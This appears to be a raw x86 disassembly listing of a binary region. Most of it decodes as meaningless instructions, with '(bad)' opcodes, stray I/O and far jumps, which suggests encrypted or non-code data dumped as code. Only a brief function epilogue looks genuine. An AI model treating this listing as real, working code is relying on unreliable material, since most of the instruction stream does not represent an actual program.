  40afff:	hlt    
  40b000:	xlat   BYTE PTR ds:[ebx]
  40b001:	dec    ebp
  40b002:	xor    eax,0x2d5ff22c
  40b007:	adc    eax,0xf014bb77
  40b00c:	jp     0x40afe3
  40b00e:	mov    al,ds:0xe6a50566
  40b013:	js     0x40b071
  40b015:	mov    eax,ds:0xda0c63de
  40b01a:	mov    ecx,DWORD PTR [eax+0x2f56f3dd]
  40b020:	ins    DWORD PTR es:[edi],dx
  40b021:	push   ebx
  40b022:	jbe    0x40b005
  40b024:	sti    
  40b025:	cmp    al,bl
  40b027:	fmul   QWORD PTR ss:[edx-0x4e]
  40b02b:	add    eax,0x643bea39
  40b030:	mov    ah,0x32
  40b032:	and    DWORD PTR [edi+0x69],ebx
  40b035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b036:	push   0x677beba7
  40b03b:	mov    dl,0x8
  40b03d:	ins    DWORD PTR es:[edi],dx
  40b03e:	sahf   
  40b03f:	pop    edi
  40b040:	dec    eax
  40b041:	mov    bl,0xb8
  40b043:	sbb    BYTE PTR gs:[esi+ebx*2+0x38],bh
  40b048:	adc    esp,DWORD PTR [eax+0x8d0c250]
  40b04e:	ficomp DWORD PTR [edx-0x11]
  40b051:	in     al,0xe9
  40b053:	mov    WORD PTR [edx-0x13],cs
  40b056:	mov    bh,0x71
  40b059:	adc    dh,BYTE PTR [ebp+0x50]
  40b05c:	loopne 0x40b0d7
  40b05e:	out    dx,al
  40b05f:	ud1    ebx,DWORD PTR [ecx+eiz*4]
  40b063:	pusha  
  40b064:	stc    
  40b065:	cmp    eax,0x4230d123
  40b06a:	loop   0x40b00a
  40b06c:	jl     0x40b032
  40b06e:	lods   eax,DWORD PTR ds:[esi]
  40b06f:	inc    edx
  40b070:	sub    ah,BYTE PTR [edx+0x62]
  40b073:	pop    eax
  40b074:	jo     0x40b02d
  40b076:	test   esp,0xbff45f46
  40b07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b07d:	fwait
  40b07e:	jmp    FWORD PTR [eax+0x5e208b8d]
  40b084:	stc    
  40b085:	popa   
  40b086:	test   eax,0xeb58d9a6
  40b08b:	cli    
  40b08c:	fsubr  QWORD PTR [edi+0x54b11506]
  40b092:	jnp    0x40b05e
  40b094:	shl    DWORD PTR [ecx-0x109cc62d],1
  40b09a:	mov    ebp,0x22c592cc
  40b09f:	xchg   ebx,eax
  40b0a0:	out    0xbc,al
  40b0a2:	fisttp DWORD PTR [ecx+0x7c]
  40b0a5:	out    dx,eax
  40b0a6:	jae    0x40b0aa
  40b0a8:	push   edi
  40b0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0aa:	mov    esp,0x3ebd0a0f
  40b0af:	aam    0xa4
  40b0b1:	mov    eax,0xe9534ce1
  40b0b6:	sub    BYTE PTR [ecx+edx*4],dl
  40b0b9:	add    BYTE PTR [ecx+0x30f99c1c],0xa3
  40b0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c1:	push   ebp
  40b0c2:	xchg   esp,eax
  40b0c3:	dec    esp
  40b0c4:	cmc    
  40b0c5:	sbb    cl,dh
  40b0c7:	imul   esi,DWORD PTR ds:0x7a029615,0xb09312c8
  40b0d1:	mov    al,ds:0xf9f874a
  40b0d6:	sbb    ebx,esi
  40b0d8:	push   ebp
  40b0d9:	mov    ebp,0x420c5ce6
  40b0de:	xchg   esi,eax
  40b0df:	stos   DWORD PTR es:[edi],eax
  40b0e0:	mov    cl,al
  40b0e2:	stc    
  40b0e3:	mov    ch,0x95
  40b0e5:	xor    al,0xf
  40b0e7:	jg     0x40b0b7
  40b0e9:	mov    ecx,DWORD PTR ds:0xb626d
  40b0ef:	ret    0x1e15
  40b0f2:	out    0xd2,eax
  40b0f4:	and    eax,0x8e4d4dc3
  40b0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0fa:	xor    ebp,DWORD PTR [ebx]
  40b0fc:	inc    eax
  40b0fd:	out    0x1e,al
  40b0ff:	mov    gs,WORD PTR [eax+esi*4]
  40b102:	leave  
  40b103:	lods   eax,DWORD PTR ds:[esi]
  40b104:	(bad)  
  40b105:	sub    al,0x61
  40b107:	adc    eax,edx
  40b109:	and    DWORD PTR [ecx+0x3c],0xbe265e30
  40b110:	push   esi
  40b111:	cmp    ch,BYTE PTR [eax+0x63]
  40b114:	jecxz  0x40b0c3
  40b116:	mov    ah,0x3b
  40b118:	push   es
  40b119:	sbb    DWORD PTR [ecx-0x10],eax
  40b11c:	cmc    
  40b11d:	or     ecx,eax
  40b11f:	ss ja  0x40b195
  40b122:	sahf   
  40b123:	ret    0x7798
  40b126:	(bad)  
  40b128:	imul   ebp,DWORD PTR [edx+esi*2-0x39eaae18],0x78a9d2ce
  40b133:	fistp  QWORD PTR [eax+ecx*8-0x73]
  40b137:	adc    eax,0xddf28029
  40b13c:	shl    ebp,cl
  40b13e:	or     eax,0x81a43ee8
  40b143:	jl     0x40b1ac
  40b145:	mov    edx,0xfc0107d7
  40b14a:	and    BYTE PTR [ecx+eax*4],bl
  40b14d:	xchg   esi,eax
  40b14e:	or     edi,esp
  40b150:	push   ss
  40b151:	mov    edi,0xba092bdf
  40b156:	shl    BYTE PTR [esi-0x70],cl
  40b159:	pusha  
  40b15a:	int    0x48
  40b15c:	pop    ebx
  40b15d:	aaa    
  40b15e:	pop    ebx
  40b15f:	dec    eax
  40b160:	jp     0x40b175
  40b162:	adc    DWORD PTR [ebx+ebp*8+0xc721a9],ebp
  40b169:	or     al,0x86
  40b16b:	mov    cl,0xee
  40b16d:	jle    0x40b1ed
  40b16f:	jo     0x40b1b0
  40b171:	xor    DWORD PTR [edx-0x73920db],eax
  40b177:	retf   
  40b178:	xor    dl,BYTE PTR [eax]
  40b17a:	(bad)  
  40b17b:	pop    edi
  40b17c:	iret   
  40b17d:	cmp    DWORD PTR [esi-0x42d0c8dd],esi
  40b183:	mov    esi,0xffeb67b6
  40b188:	sbb    eax,0x8bb96826
  40b18d:	pop    ecx
  40b18e:	jecxz  0x40b20c
  40b190:	call   0x31268974
  40b195:	sbb    eax,0xd9043e7b
  40b19a:	sbb    eax,0xea136c1
  40b19f:	inc    ecx
  40b1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1a1:	icebp  
  40b1a2:	xor    DWORD PTR [edx],ebx
  40b1a4:	pop    esi
  40b1a5:	sub    cl,dl
  40b1a7:	xchg   edi,eax
  40b1a8:	mov    dl,0x39
  40b1aa:	ds inc eax
  40b1ac:	mov    cl,0xe7
  40b1ae:	inc    esp
  40b1af:	xor    al,0xc0
  40b1b1:	inc    ebx
  40b1b2:	dec    edx
  40b1b3:	repz cmp eax,0xeba5b633
  40b1b9:	cmp    al,0x28
  40b1bb:	call   FWORD PTR [edx-0x5b]
  40b1be:	jp     0x40b1a6
  40b1c0:	mov    eax,0xda58caea
  40b1c5:	dec    ebx
  40b1c6:	fs push ecx
  40b1c8:	inc    eax
  40b1c9:	repnz inc ebp
  40b1cb:	lahf   
  40b1cc:	outs   dx,DWORD PTR ds:[esi]
  40b1cd:	inc    esi
  40b1ce:	mov    ss,WORD PTR [ebp+0x37]
  40b1d1:	bound  ebx,QWORD PTR ds:0x9e897d84
  40b1d7:	out    dx,al
  40b1d8:	mov    ebp,0x80cd6a70
  40b1dd:	iret   
  40b1de:	sbb    ecx,DWORD PTR [ebx+0x5]
  40b1e1:	stos   BYTE PTR es:[edi],al
  40b1e2:	aaa    
  40b1e3:	outs   dx,BYTE PTR ds:[esi]
  40b1e4:	pusha  
  40b1e5:	inc    edx
  40b1e6:	or     BYTE PTR [edx-0x173812d3],dh
  40b1ec:	loop   0x40b223
  40b1ee:	mov    dh,0x96
  40b1f0:	mov    esp,0x3fc161a2
  40b1f5:	inc    edi
  40b1f6:	mov    cl,0xb8
  40b1f8:	push   ds
  40b1f9:	stos   BYTE PTR es:[edi],al
  40b1fa:	sbb    BYTE PTR [edx-0x4ecd9c52],dl
  40b200:	mov    dh,0xfd
  40b202:	xchg   esi,eax
  40b203:	pusha  
  40b204:	mov    bl,0x5d
  40b206:	mov    dh,0xf9
  40b208:	int    0x47
  40b20a:	or     DWORD PTR [edi-0x56],esp
  40b20d:	ins    BYTE PTR es:[edi],dx
  40b20e:	mov    eax,ds:0xab58e947
  40b213:	rcl    BYTE PTR cs:[edx+ecx*8],0x71
  40b218:	lea    esp,ds:0xf6bd19b2
  40b21e:	ins    BYTE PTR es:[edi],dx
  40b21f:	fucomip st,st(0)
  40b221:	jbe    0x40b1c1
  40b223:	mov    dh,0x62
  40b225:	les    eax,FWORD PTR [ebx]
  40b227:	and    al,0x5e
  40b229:	cld    
  40b22a:	xchg   ebx,eax
  40b22b:	int    0xf6
  40b22d:	ficom  WORD PTR [eax+edx*2]
  40b230:	imul   edi,DWORD PTR [ebp+0xa0f0625],0x4b
  40b237:	aaa    
  40b238:	xor    eax,0x2d5756ca
  40b23d:	dec    edx
  40b23e:	xchg   edx,eax
  40b23f:	iret   
  40b240:	dec    esi
  40b241:	in     eax,0xcf
  40b243:	sub    al,0xaa
  40b245:	mov    WORD PTR [ebx-0x47858917],fs
  40b24b:	jg     0x40b1e6
  40b24d:	retf   0x4fe0
  40b250:	dec    esp
  40b251:	data16 adc dl,BYTE PTR [edi-0x1c8ecbc1]
  40b258:	shl    DWORD PTR [edx-0x64],0x90
  40b25c:	fwait
  40b25d:	and    DWORD PTR [ebx],edx
  40b25f:	cmp    cl,ch
  40b261:	cli    
  40b262:	es add esp,ecx
  40b265:	dec    ebp
  40b266:	addr16 in eax,0xd4
  40b269:	cmp    ebx,esi
  40b26b:	xor    bh,dl
  40b26d:	mov    bl,0xc1
  40b26f:	push   cs
  40b270:	addr16 mov ds:0x459b,eax
  40b274:	arpl   bp,bx
  40b276:	dec    eax
  40b277:	sbb    BYTE PTR [edi+esi*4-0x37],dh
  40b27b:	push   ecx
  40b27c:	and    BYTE PTR [ebx],al
  40b27e:	mov    BYTE PTR [esi],ah
  40b280:	(bad)  
  40b281:	dec    esp
  40b282:	and    eax,0x9e0bd9ee
  40b287:	mov    gs,WORD PTR [ebx]
  40b289:	jnp    0x1e3ea457
  40b28f:	adc    BYTE PTR [edx+0x34],0x66
  40b293:	mov    ecx,0x6bf22f72
  40b298:	sub    eax,0xfe223193
  40b29d:	push   cs
  40b29e:	adc    dh,BYTE PTR [esi-0x333775c4]
  40b2a4:	out    0x94,al
  40b2a6:	pop    edx
  40b2a7:	mov    edx,0x4f0146bb
  40b2ac:	add    ecx,esi
  40b2ae:	mov    ?,esi
  40b2b0:	ja     0x40b329
  40b2b2:	push   es
  40b2b3:	or     ch,BYTE PTR [ebx+0x66]
  40b2b6:	adc    DWORD PTR [ebx+0x763dacb9],ebx
  40b2bc:	jp     0x40b250
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xe324b132
  40b2d2:	ds inc esi
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	sahf   
  40b2dd:	rcl    ah,0xd9
  40b2e0:	xor    al,BYTE PTR [edi]
  40b2e2:	jnp    0x40b356
  40b2e4:	mov    bl,0x9a
  40b2e6:	xchg   edi,eax
  40b2e7:	test   DWORD PTR [eax+0x7e076105],ebp
  40b2ed:	rol    DWORD PTR [ecx],0xc4
  40b2f0:	jb     0x40b28e
  40b2f2:	(bad)  
  40b2f3:	and    ah,BYTE PTR [ecx]
  40b2f5:	(bad)  
  40b2f6:	pushf  
  40b2f7:	cli    
  40b2f8:	mov    DWORD PTR [esi-0x72],ebp
  40b2fb:	mov    ecx,0xa6425b2e
  40b300:	idiv   ebx
  40b302:	mov    dh,BYTE PTR [esi]
  40b304:	out    dx,eax
  40b305:	(bad)  
  40b306:	mov    cl,0xf6
  40b308:	and    eax,0x74f358c7
  40b30d:	popf   
  40b30e:	inc    ecx
  40b30f:	or     eax,0x1ea6f77b
  40b314:	pop    es
  40b315:	add    eax,0x49a6f056
  40b31a:	stos   DWORD PTR es:[edi],eax
  40b31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b31c:	int    0xcf
  40b31e:	(bad)  
  40b31f:	lds    edx,FWORD PTR [ebx-0x1028993c]
  40b325:	sbb    eax,0x2ef6381b
  40b32a:	pusha  
  40b32b:	jno    0x40b326
  40b32d:	push   edi
  40b32e:	push   esp
  40b32f:	jno    0x40b2cc
  40b331:	and    eax,0x2b4e4414
  40b336:	jns    0x40b2e1
  40b338:	imul   ecx,DWORD PTR [ecx-0x11],0xd85270e3
  40b33f:	fsubp  st(4),st
  40b341:	or     ecx,DWORD PTR [ebx+0x5d]
  40b344:	mov    ds:0x5f40fde3,al
  40b349:	jl     0x40b2e7
  40b34b:	mov    al,ds:0xa1973aaf
  40b350:	out    dx,eax
  40b351:	sub    DWORD PTR [ecx],eax
  40b353:	mov    ?,eax
  40b355:	xor    esi,ebx
  40b357:	(bad)  
  40b358:	retf   
  40b359:	ds inc edx
  40b35b:	mov    ecx,0xa82acc0e
  40b360:	xchg   ecx,eax
  40b361:	dec    ebx
  40b362:	(bad)  
  40b363:	sub    BYTE PTR [edi-0x51224728],dl
  40b369:	aam    0xff
  40b36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b36c:	mov    dh,0x30
  40b36e:	rcr    DWORD PTR [ebp+0x7e6623ab],0x10
  40b375:	xchg   ecx,eax
  40b376:	or     ebp,DWORD PTR [esi]
  40b378:	fcmovbe st,st(0)
  40b37a:	(bad)  
  40b37b:	int    0xd2
  40b37d:	jg     0xb527e1b
  40b383:	mov    WORD PTR [eax-0x34425564],?
  40b389:	sbb    ah,BYTE PTR [esi+eax*8]
  40b38c:	sbb    DWORD PTR [ecx],ebx
  40b38e:	and    eax,0x3e66d991
  40b393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b394:	cdq    
  40b395:	icebp  
  40b396:	cmp    eax,0xfca41a2c
  40b39b:	sub    ebp,DWORD PTR [edi+0x16c2c28c]
  40b3a1:	pop    edx
  40b3a2:	jmp    0x5e90:0x87ed4bd3
  40b3a9:	test   eax,0xcfd83898
  40b3ae:	bndldx (bad),[eax]
  40b3b1:	ret    0x4315
  40b3b4:	es aas 
  40b3b6:	mov    bh,BYTE PTR [ebx-0x12680076]
  40b3bc:	(bad)  
  40b3bd:	xchg   esi,eax
  40b3be:	mov    al,0xf6
  40b3c0:	stc    
  40b3c1:	imul   esi,ecx,0x8c6e97df
  40b3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3c8:	stos   DWORD PTR es:[edi],eax
  40b3c9:	add    DWORD PTR [ebx],ecx
  40b3cb:	mov    cl,0xa3
  40b3cd:	icebp  
  40b3ce:	pop    DWORD PTR [edx-0x1eae2bab]
  40b3d4:	jecxz  0x40b42a
  40b3d6:	fnstenv [edx-0x4267d1d8]
  40b3dc:	pop    ds
  40b3dd:	mov    ah,0x44
  40b3df:	daa    
  40b3e0:	aad    0x13
  40b3e2:	mov    esi,0x8094bbeb
  40b3e7:	rcr    DWORD PTR [ebp-0x9],1
  40b3ea:	pop    ecx
  40b3eb:	pop    ecx
  40b3ec:	fbstp  TBYTE PTR [ebp-0x3]
  40b3ef:	ja     0x40b3e8
  40b3f1:	jg     0x40b3ae
  40b3f3:	xchg   edx,eax
  40b3f4:	inc    eax
  40b3f5:	ficom  DWORD PTR [ecx]
  40b3f7:	or     ch,cl
  40b3f9:	retf   0x1a6d
  40b3fc:	(bad)  
  40b3fd:	mov    eax,DWORD PTR [edx-0x5]
  40b400:	xchg   ebx,eax
  40b401:	fxch   st(4)
  40b403:	push   ebp
  40b404:	mov    ebx,0x69270fd6
  40b409:	jp     0x40b409
  40b40b:	clc    
  40b40c:	rcr    al,1
  40b40e:	inc    BYTE PTR [ecx-0x498c653c]
  40b414:	ja     0x40b44f
  40b416:	ss pop ecx
  40b418:	sbb    eax,0xd73e30b8
  40b41e:	ret    
  40b41f:	mov    ds:0x5ba2532a,al
  40b424:	mov    al,ds:0x38e43d7d
  40b429:	mov    dl,0x88
  40b42b:	mov    ds:0x196f869,al
  40b430:	sbb    dh,ah
  40b432:	pushf  
  40b433:	outs   dx,BYTE PTR ds:[esi]
  40b434:	(bad)  
  40b435:	fcmovu st,st(7)
  40b437:	xor    DWORD PTR [esi-0x1a],edi
  40b43a:	jge    0x40b429
  40b43c:	jle    0x40b3db
  40b43e:	test   eax,0x7f437d0f
  40b443:	sbb    DWORD PTR [ebx+eax*2-0x5f3b33c8],0xffffffb7
  40b44b:	fst    st(1)
  40b44d:	push   ds
  40b44e:	jmp    0x40b46a
  40b450:	mov    eax,ds:0x2895ff41
  40b455:	sub    edx,DWORD PTR [eax+0x1]
  40b458:	or     bh,BYTE PTR [edx+0x525f84bd]
  40b45e:	daa    
  40b45f:	int    0x3e
  40b461:	xchg   edi,eax
  40b462:	pop    ds
  40b463:	out    0xc8,al
  40b465:	push   cs
  40b466:	add    BYTE PTR [ecx+0x3cb3cbc5],dl
  40b46c:	ret    
  40b46d:	or     al,0xda
  40b46f:	lods   eax,DWORD PTR ds:[esi]
  40b470:	mov    ds:0x1e6e0ce6,eax
  40b475:	push   cs
  40b476:	pop    ds
  40b477:	ja     0x40b454
  40b479:	or     dh,BYTE PTR [eax+0x463f4653]
  40b47f:	cmc    
  40b480:	loope  0x40b406
  40b482:	mov    BYTE PTR [esi-0x48],bh
  40b485:	aas    
  40b486:	sahf   
  40b487:	cmp    eax,0xa5ea6286
  40b48c:	sub    al,BYTE PTR [edi+ecx*1+0x3038aca3]
  40b493:	xor    al,0x44
  40b495:	in     al,dx
  40b496:	lods   al,BYTE PTR ds:[esi]
  40b497:	mov    DWORD PTR [esi],0x9dd8e63d
  40b49d:	pop    ebp
  40b49e:	and    esp,DWORD PTR [esi+0x19]
  40b4a1:	mov    dl,0xf5
  40b4a3:	dec    esp
  40b4a4:	add    al,0xbd
  40b4a6:	popa   
  40b4a7:	test   eax,0xc9daa2aa
  40b4ac:	jl     0x40b4e9
  40b4ae:	push   es
  40b4af:	lgs    ebx,FWORD PTR [esp+esi*8+0x4a]
  40b4b4:	lods   eax,DWORD PTR ds:[esi]
  40b4b5:	aam    0xad
  40b4b7:	or     al,0xac
  40b4b9:	lock push edi
  40b4bb:	jecxz  0x40b4b8
  40b4bd:	dec    esp
  40b4be:	mov    ecx,0x7755c3d0
  40b4c3:	cmp    ah,BYTE PTR [ebx-0x72]
  40b4c6:	dec    ebp
  40b4c7:	inc    ebx
  40b4c8:	mov    edx,ebp
  40b4ca:	pop    es
  40b4cb:	inc    ecx
  40b4cc:	jle    0x40b456
  40b4ce:	sti    
  40b4cf:	cmp    al,0x8f
  40b4d1:	fld    DWORD PTR [edi-0x7c]
  40b4d4:	mov    esp,0xdcb0fe8b
  40b4d9:	outs   dx,BYTE PTR ds:[esi]
  40b4da:	xchg   ecx,eax
  40b4db:	cmp    BYTE PTR [esi-0x31],bl
  40b4de:	xchg   esi,eax
  40b4df:	push   esp
  40b4e0:	mov    WORD PTR [ebx],ss
  40b4e2:	int3   
  40b4e3:	cwde   
  40b4e4:	cld    
  40b4e5:	scas   eax,DWORD PTR es:[edi]
  40b4e6:	fiadd  DWORD PTR [esi]
  40b4e8:	mov    ds:0xbd99448a,eax
  40b4ed:	mov    esi,0x3d10dda5
  40b4f2:	push   cs
  40b4f3:	(bad)  
  40b4f5:	test   DWORD PTR [edx+0x12],ebp
  40b4f8:	or     ah,BYTE PTR [eax-0x1f]
  40b4fb:	and    DWORD PTR [eax+0x6513e413],esp
  40b501:	sti    
  40b502:	ds jle 0x40b56e
  40b505:	jecxz  0x40b4a4
  40b507:	and    BYTE PTR [eax-0xe420d35],0xe2
  40b50e:	js     0x40b4c8
  40b510:	jp     0x40b4dd
  40b512:	add    dl,BYTE PTR [edx+0x16]
  40b515:	cdq    
  40b516:	jb     0x40b4b0
  40b518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b519:	and    BYTE PTR ds:0x353bbb29,al
  40b51f:	mov    al,0xeb
  40b521:	leave  
  40b522:	js     0x40b567
  40b524:	adc    edi,edi
  40b526:	pop    esp
  40b527:	xor    BYTE PTR [ecx],bl
  40b529:	outs   dx,BYTE PTR ds:[esi]
  40b52a:	jmp    0x8f89:0x2497b65d
  40b531:	adc    ebp,ebp
  40b533:	ins    BYTE PTR es:[edi],dx
  40b534:	and    eax,0xd61195e6
  40b539:	lds    eax,FWORD PTR [esi]
  40b53b:	outs   dx,BYTE PTR ds:[esi]
  40b53c:	xchg   edx,eax
  40b53d:	stos   BYTE PTR es:[edi],al
  40b53e:	sti    
  40b53f:	(bad)  
  40b540:	rcr    cl,0x11
  40b543:	jle    0x40b4ca
  40b545:	xor    BYTE PTR [ebx+0xe978017],bl
  40b54b:	jo     0x40b54b
  40b54d:	jb     0x40b5c6
  40b54f:	les    esi,FWORD PTR [eax]
  40b551:	popa   
  40b552:	and    DWORD PTR [esi],esi
  40b554:	stc    
  40b555:	mov    eax,ds:0x33970c7a
  40b55a:	mov    ebx,0x5915e613
  40b55f:	mov    ds:0xe37222c2,eax
  40b564:	fs dec esi
  40b566:	fwait
  40b567:	inc    eax
  40b568:	pusha  
  40b569:	cmc    
  40b56a:	adc    eax,esp
  40b56c:	or     al,0x7e
  40b56e:	pusha  
  40b56f:	dec    ebp
  40b570:	(bad)  
  40b571:	pusha  
  40b572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b573:	das    
  40b574:	jno    0x40b588
  40b576:	in     al,dx
  40b577:	xor    DWORD PTR [esp+ebp*4-0xa],esp
  40b57b:	jbe    0x40b526
  40b57d:	mov    ebp,DWORD PTR [esi-0x6fc227b7]
  40b583:	bound  eax,QWORD PTR [ebx]
  40b585:	stos   DWORD PTR es:[edi],eax
  40b586:	jb     0x40b553
  40b588:	sub    eax,0x52aeaabc
  40b58d:	mov    al,0x52
  40b58f:	bound  ebp,QWORD PTR [ebp+0x1649b056]
  40b595:	mov    DWORD PTR [eax+0x3d],ebx
  40b598:	jl     0x40b608
  40b59a:	jl     0x40b58b
  40b59c:	xchg   ebp,eax
  40b59d:	ins    DWORD PTR es:[edi],dx
  40b59e:	pushf  
  40b59f:	adc    BYTE PTR [esi+0x66750a07],bl
  40b5a5:	cli    
  40b5a6:	mov    esi,0xa6fcb49a
  40b5ab:	je     0x40b612
  40b5ad:	jo     0x40b600
  40b5af:	popa   
  40b5b0:	test   esi,eax
  40b5b2:	push   edi
  40b5b3:	aas    
  40b5b4:	fcom   DWORD PTR ds:0x575180a0
  40b5ba:	xor    edi,eax
  40b5bc:	add    ebp,DWORD PTR [ebx-0xdec5ea8]
  40b5c2:	in     al,0x2
  40b5c4:	jle    0x40b599
  40b5c6:	mov    esi,0x3a6cdea5
  40b5cb:	aam    0xcf
  40b5cd:	cmp    bl,al
  40b5cf:	add    cl,BYTE PTR [edi+0x28deef71]
  40b5d5:	mov    edi,DWORD PTR [ecx]
  40b5d7:	std    
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x57332a7c]
  40b60d:	jle    0x40b685
  40b60f:	jg     0x40b5db
  40b611:	(bad)  
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	xlat   BYTE PTR ds:[ebx]
  40b619:	jae    0x40b5fb
  40b61b:	out    dx,eax
  40b61c:	pop    eax
  40b61d:	add    bl,BYTE PTR [ebx+ebp*2+0x45087e6]
  40b624:	mov    bh,0xc7
  40b626:	pop    ebp
  40b627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b628:	mov    DWORD PTR [ecx-0x783273f6],ebx
  40b62e:	sbb    bh,al
  40b630:	enterw 0xc71f,0x84
  40b635:	rcl    BYTE PTR [edx+0x67],0xd8
  40b639:	leave  
  40b63a:	and    ecx,DWORD PTR [edx]
  40b63c:	jmp    0xd6aab33e
  40b641:	pop    ecx
  40b642:	sar    BYTE PTR [ecx-0x1fd7ec6c],1
  40b648:	in     eax,0x74
  40b64a:	sahf   
  40b64b:	ja     0x40b657
  40b64d:	adc    ebp,eax
  40b64f:	dec    ecx
  40b650:	in     eax,0x74
  40b652:	mov    bl,0x92
  40b654:	rcr    BYTE PTR [edi+0x30],0x4e
  40b658:	cmp    bl,BYTE PTR [ebp-0x1fa3db2e]
  40b65e:	adc    ebp,DWORD PTR [eax]
  40b660:	outs   dx,DWORD PTR gs:[esi]
  40b662:	adc    DWORD PTR gs:[ecx],ebp
  40b665:	xchg   ebx,eax
  40b666:	dec    ebx
  40b667:	out    0x98,eax
  40b669:	mov    eax,0x96ddf572
  40b66e:	retf   0x6daa
  40b671:	fidiv  DWORD PTR [ebx]
  40b673:	mov    eax,ds:0x1f708de1
  40b678:	mov    cl,0x3f
  40b67a:	or     edi,DWORD PTR [ebp-0xec61f81]
  40b680:	clc    
  40b681:	inc    ecx
  40b682:	jg     0x40b60e
  40b684:	add    DWORD PTR [ecx-0x1a],eax
  40b687:	mov    ah,0xa7
  40b689:	loop   0x40b667
  40b68b:	push   es
  40b68c:	sub    edi,DWORD PTR [ecx]
  40b68e:	jp     0x40b614
  40b690:	add    DWORD PTR [edi+0xd9fd227],eax
  40b696:	adc    eax,0x78af014c
  40b69b:	cli    
  40b69c:	outs   dx,BYTE PTR ds:[esi]
  40b69d:	dec    ebx
  40b69e:	ja     0x40b635
  40b6a0:	xchg   edi,eax
  40b6a1:	adc    BYTE PTR [edx-0x50],bl
  40b6a4:	dec    ecx
  40b6a5:	pop    ss
  40b6a6:	push   eax
  40b6a7:	add    ecx,DWORD PTR [edx+eiz*2]
  40b6aa:	jbe    0x40b6c4
  40b6ac:	rcr    edi,cl
  40b6ae:	ret    0x6202
  40b6b1:	and    BYTE PTR [ebx-0x10],cl
  40b6b4:	push   ebp
  40b6b5:	sbb    DWORD PTR ds:0x79b370cc,0x1fe3b500
  40b6bf:	pushf  
  40b6c0:	xor    eax,esi
  40b6c2:	sbb    ebx,edx
  40b6c4:	mov    dh,0x64
  40b6c6:	popf   
  40b6c7:	jg     0x40b72c
  40b6c9:	retf   0xee2e
  40b6cc:	je     0x40b68a
  40b6ce:	pushf  
  40b6cf:	imul   edi,DWORD PTR [ebx],0xffffffca
  40b6d2:	mov    dh,0xd
  40b6d4:	push   0xf1c612c0
  40b6d9:	(bad)  
  40b6da:	mov    eax,ds:0x3f3a9c2f
  40b6df:	test   BYTE PTR [eax+0x6d],al
  40b6e2:	or     DWORD PTR [esi+edx*2],esp
  40b6e5:	or     DWORD PTR [esi-0x63b971d4],esi
  40b6eb:	mov    dh,0x37
  40b6ed:	pop    ebx
  40b6ee:	sub    DWORD PTR ds:0x6f9ae88e,ecx
  40b6f4:	dec    esp
  40b6f5:	(bad)  
  40b6f6:	jp     0x40b6ee
  40b6f8:	aas    
  40b6f9:	or     esp,DWORD PTR [ecx+eax*2-0x6b]
  40b6fd:	lock das 
  40b6ff:	or     dh,BYTE PTR [eax-0x53]
  40b702:	cld    
  40b703:	sar    DWORD PTR [ebp+0x73],1
  40b706:	mov    gs,WORD PTR [edx]
  40b708:	jle    0x40b6c6
  40b70a:	cmp    DWORD PTR [ebp-0x21],0xe6c40d49
  40b711:	mov    al,0xb9
  40b713:	sub    eax,0xc1e2cccf
  40b718:	mov    ebx,0xaf4d7a7f
  40b71d:	jmp    0x659d:0xffe82eec
  40b724:	(bad)  
  40b725:	sbb    esp,DWORD PTR [ebx-0x55]
  40b728:	cmp    DWORD PTR [ebp+0x22],esi
  40b72b:	mov    bl,0x18
  40b72d:	dec    edi
  40b72e:	les    eax,FWORD PTR [ecx]
  40b730:	mov    WORD PTR [edx+0x42],fs
  40b733:	out    0x2a,al
  40b735:	mov    al,0xf9
  40b737:	add    bl,bh
  40b739:	scas   eax,DWORD PTR es:[edi]
  40b73a:	inc    edx
  40b73b:	or     eax,0x85c54065
  40b740:	mov    esi,DWORD PTR [ecx+0x37]
  40b743:	inc    esp
  40b744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b745:	sub    ch,0x84
  40b748:	or     bl,bh
  40b74a:	adc    BYTE PTR [esi-0x52],dl
  40b74d:	shr    BYTE PTR [edx+0xb],1
  40b750:	cwde   
  40b751:	ds je  0x40b739
  40b754:	repnz mov ebp,0x5383bb1c
  40b75a:	loopne 0x40b6ed
  40b75c:	aam    0x9e
  40b75e:	inc    ebx
  40b75f:	dec    esi
  40b760:	sbb    DWORD PTR [edx+ecx*4-0x59],ecx
  40b764:	and    DWORD PTR [esi-0x6e7ef186],ecx
  40b76a:	cld    
  40b76b:	sub    DWORD PTR [ebp+0xd52aed7],ebx
  40b771:	mov    edi,0x75083fc2
